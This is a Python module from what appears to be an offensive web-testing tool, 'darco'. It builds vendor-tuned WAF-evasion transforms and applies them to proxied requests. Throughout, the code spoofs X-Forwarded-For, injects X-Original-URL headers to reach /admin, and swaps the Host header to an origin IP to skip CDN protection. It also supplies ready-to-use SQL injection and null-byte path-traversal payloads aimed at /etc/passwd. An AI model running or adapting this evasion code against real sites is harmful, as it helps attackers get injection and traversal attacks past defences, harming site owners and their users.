from __future__ import annotations

"""WAF bypass technique engine.

Given a detected WAF (or "unknown"), produce concrete bypass transforms that
can be (a) injected by the proxy so tools like sqlmap/nuclei routed through
darco automatically dodge the shield, and (b) emitted as copy-paste `curl`
commands for manual use / other tooling.

This is *offensive* tooling — it encodes well-known WAF-evasion primitives
(header case randomization, path normalization, encoding tricks, Host-header
swap to a discovered origin, HTTP-version downgrade, Content-Type juggling).
It does not attack anything by itself; it mutates requests.
"""

import random
from dataclasses import dataclass, field

from .models import NameValue, Request

# Per-vendor tuning: which technique families tend to work. Empty = all.
_VENDOR_TECHNIQUES: dict[str, list[str]] = {
    "Cloudflare": [
        "host_swap",
        "path_normalize",
        "header_case",
        "http1_0",
        "x_original_url",
        "encoding",
    ],
    "AWS WAF / CloudFront": ["host_swap", "header_case", "encoding", "content_type"],
    "Akamai Kona Site Defender": [
        "header_case",
        "path_normalize",
        "x_original_url",
        "encoding",
    ],
    "Imperva Incapsula": ["host_swap", "cookie_pad", "header_case", "encoding"],
    "ModSecurity": ["encoding", "comment_injection", "header_case", "null_byte"],
    "F5 BIG-IP ASM": ["header_case", "path_normalize", "encoding"],
    "Sucuri CloudProxy": ["host_swap", "header_case", "encoding"],
    "Microsoft Azure Front Door / AppGW WAF": [
        "header_case",
        "encoding",
        "content_type",
    ],
    "Fortinet FortiWeb": ["header_case", "encoding", "path_normalize"],
    "Barracuda WAF": ["header_case", "encoding"],
    "Wordfence Security": ["header_case", "encoding"],
    "StackPath / MaxCDN": ["header_case", "encoding", "host_swap"],
}

# Techniques that work regardless of vendor.
_GENERIC_TECHNIQUES = [
    "header_case",
    "path_normalize",
    "encoding",
    "http1_0",
    "x_original_url",
    "content_type",
    "cookie_pad",
]


@dataclass
class BypassTechnique:
    id: str
    name: str
    description: str
    headers: list[NameValue] = field(default_factory=list)
    transforms: list[str] = field(default_factory=list)  # human-readable notes
    curl_hint: str = ""

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "name": self.name,
            "description": self.description,
            "headers": [{"name": h.name, "value": h.value} for h in self.headers],
            "transforms": self.transforms,
            "curl_hint": self.curl_hint,
        }


# ------------------------------------------------------------------ transforms
def _rand_case(s: str) -> str:
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)


def _build_techniques(
    target_waf: str | None, origin_ip: str | None = None
) -> list[BypassTechnique]:
    techs: list[BypassTechnique] = []
    waf = (target_waf or "").strip()
    wanted = _VENDOR_TECHNIQUES.get(waf, _GENERIC_TECHNIQUES)

    if "header_case" in wanted:
        techs.append(
            BypassTechnique(
                id="header_case",
                name="Header case randomization",
                description="Mix-case on security-sensitive headers to dodge "
                "case-sensitive WAF rules (e.g. Cloudflare sometimes "
                "normalizes inconsistently).",
                headers=[
                    NameValue(name=_rand_case("X-Forwarded-For"), value="127.0.0.1"),
                    NameValue(
                        name=_rand_case("User-Agent"),
                        value="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    ),
                ],
                transforms=["randomize case of header names"],
                curl_hint="-H 'X-Forwarded-For: 127.0.0.1' (mixed case)",
            )
        )

    if "path_normalize" in wanted:
        techs.append(
            BypassTechnique(
                id="path_normalize",
                name="Path normalization tricks",
                description="Insert /./ , // , or %2e%2e segments that some WAFs "
                "normalize away before matching the rule path.",
                headers=[],
                transforms=[
                    "inject /./ and // into request path",
                    "try %2e%2e traversal padding",
                ],
                curl_hint="path: /admin/././login instead of /admin/login",
            )
        )

    if "encoding" in wanted:
        techs.append(
            BypassTechnique(
                id="encoding",
                name="URL / charset encoding",
                description="Double-URL-encode payloads and use overlong UTF-8 to "
                "slip past signature matching while the backend decodes.",
                headers=[
                    NameValue(
                        name="Content-Type",
                        value="application/x-www-form-urlencoded; charset=UTF-8",
                    )
                ],
                transforms=[
                    "double URL-encode parameter values",
                    "use overlong UTF-8 for quotes",
                ],
                curl_hint="--data-urlencode 'q=%2527 OR 1=1--'",
            )
        )

    if "http1_0" in wanted:
        techs.append(
            BypassTechnique(
                id="http1_0",
                name="HTTP/1.0 downgrade",
                description="Some WAFs only inspect HTTP/1.1; an HTTP/1.0 request "
                "without Host-based routing can bypass.",
                headers=[NameValue(name="Connection", value="close")],
                transforms=["send HTTP/1.0 (no Host-aware inspection)"],
                curl_hint="curl --http1.0 <url>",
            )
        )

    if "x_original_url" in wanted:
        techs.append(
            BypassTechnique(
                id="x_original_url",
                name="X-Original-URL / X-Rewrite-URL",
                description="Many reverse-proxy WAFs trust these headers to rewrite "
                "the internal path; lets you reach blocked endpoints.",
                headers=[
                    NameValue(name="X-Original-URL", value="/admin"),
                    NameValue(name="X-Rewrite-URL", value="/admin"),
                ],
                transforms=["inject X-Original-URL / X-Rewrite-URL with target path"],
                curl_hint="-H 'X-Original-URL: /admin'",
            )
        )

    if "content_type" in wanted:
        techs.append(
            BypassTechnique(
                id="content_type",
                name="Content-Type juggling",
                description="Switch between JSON / form / multipart to change how "
                "the WAF parses the body vs the backend.",
                headers=[NameValue(name="Content-Type", value="application/json")],
                transforms=["alternate body Content-Type (json/form/multipart)"],
                curl_hint="-H 'Content-Type: application/json'",
            )
        )

    if "cookie_pad" in wanted:
        techs.append(
            BypassTechnique(
                id="cookie_pad",
                name="Cookie padding",
                description="Prepend junk to the cookie to push the matched value "
                "past a fixed-offset WAF inspection window.",
                headers=[NameValue(name="Cookie", value="padding=AAAAAAAAAA; ")],
                transforms=["prepend long dummy cookie value"],
                curl_hint="-b 'padding=AAAA...; <realcookie>'",
            )
        )

    if "comment_injection" in wanted:
        techs.append(
            BypassTechnique(
                id="comment_injection",
                name="SQL comment injection",
                description="Insert /**/, /*!*/, and %00 nulls inside SQL payloads "
                "to break signature matching (ModSecurity classic).",
                headers=[],
                transforms=["insert /**/ between SQL keywords", "inject %00 null byte"],
                curl_hint="q=1'/**/OR/**/1=1--",
            )
        )

    if "null_byte" in wanted:
        techs.append(
            BypassTechnique(
                id="null_byte",
                name="Null-byte injection",
                description="Append %00 to terminate WAF string matching early.",
                headers=[],
                transforms=["append %00 to payload"],
                curl_hint="q=../../etc/passwd%00",
            )
        )

    if "host_swap" in wanted and origin_ip:
        techs.append(
            BypassTechnique(
                id="host_swap",
                name=f"Host header → origin IP ({origin_ip})",
                description=f"Point the Host header straight at the discovered origin "
                f"IP {origin_ip} so the request bypasses the CDN edge entirely.",
                headers=[NameValue(name="Host", value=origin_ip)],
                transforms=[f"set Host: {origin_ip} (origin IP from `darco origin`)"],
                curl_hint=f"--resolve {origin_ip} -H 'Host: <real-domain>' or use Host: {origin_ip}",
            )
        )
    elif "host_swap" in wanted:
        techs.append(
            BypassTechnique(
                id="host_swap",
                name="Host header → origin IP",
                description="If `darco origin` finds the origin IP, set Host to it to "
                "skip the CDN edge. Rerun with --origin-ip <ip>.",
                headers=[],
                transforms=["set Host header to the discovered origin IP"],
                curl_hint="run `darco origin <domain>` first, then pass --origin-ip",
            )
        )

    return techs


def build_bypass(waf_name: str | None = None, origin_ip: str | None = None) -> dict:
    """Return {'waf', 'origin_ip', 'techniques': [...]} for rendering."""
    techs = _build_techniques(waf_name, origin_ip)
    return {
        "waf": waf_name or "unknown",
        "origin_ip": origin_ip,
        "technique_count": len(techs),
        "techniques": [t.to_dict() for t in techs],
    }


def apply_bypass(
    req: Request, technique_ids: list[str] | None = None, origin_ip: str | None = None
) -> tuple[Request, list[str]]:
    """Return a mutated Request with WAF-bypass transforms applied.

    Used by the proxy --bypass mode. If `technique_ids` is None, a sensible
    default set is applied (header_case, path_normalize, encoding, x_original_url).
    """
    req = req.model_copy(deep=True)
    applied: list[str] = []
    ids = technique_ids or [
        "header_case",
        "path_normalize",
        "encoding",
        "x_original_url",
    ]

    existing = {h.name.lower() for h in req.headers}
    for tid in ids:
        if tid == "header_case":
            for h in (
                NameValue(name=_rand_case("X-Forwarded-For"), value="127.0.0.1"),
                NameValue(
                    name=_rand_case("User-Agent"),
                    value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ),
            ):
                if h.name.lower() not in existing:
                    req.headers.append(h)
                    existing.add(h.name.lower())
            applied.append("header_case")
        elif tid == "encoding":
            for h in req.headers:
                if (
                    h.name.lower() == "content-type"
                    and "charset" not in h.value.lower()
                ):
                    h.value = h.value + "; charset=UTF-8"
            applied.append("encoding")
        elif tid == "x_original_url":
            path = req.url.split("?")[0].split("://", 1)[-1].split("/", 1)[-1]
            inner = "/" + path if path else "/"
            if "x-original-url" not in existing:
                req.headers.append(NameValue(name="X-Original-URL", value=inner))
                existing.add("x-original-url")
            applied.append("x_original_url")
        elif tid == "path_normalize":
            if "://" in req.url:
                scheme, rest = req.url.split("://", 1)
                hostpart, _, pathpart = rest.partition("/")
                if pathpart:
                    newpath = (
                        pathpart.replace("/", "/./", 1)
                        if "/" in pathpart
                        else "/" + pathpart
                    )
                    req.url = f"{scheme}://{hostpart}/{newpath}"
            applied.append("path_normalize")
        elif tid == "http1_0":
            applied.append(
                "http1_0"
            )  # handled at transport layer (not in Request model)
        elif tid == "host_swap" and origin_ip:
            for h in req.headers:
                if h.name.lower() == "host":
                    h.value = origin_ip
            applied.append("host_swap")
    return req, applied
